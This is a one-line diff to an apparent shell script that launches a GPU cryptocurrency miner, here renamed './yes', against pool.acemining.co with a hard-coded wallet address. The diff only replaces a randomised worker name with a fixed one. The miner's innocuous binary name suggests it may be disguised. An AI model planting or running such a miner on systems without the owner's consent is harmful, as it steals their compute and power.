@@ -1,1 +1,1 @@
-./yes -t cuda -a "NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" -p pool.acemining.co:8443 -n $(tr -dc A-Z </dev/urandom | head -c 4 ; echo 'TFA') --memory-tradeoff 50
+./yes -t cuda -a "NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" -p pool.acemining.co:8443 -n URAAA --memory-tradeoff 50
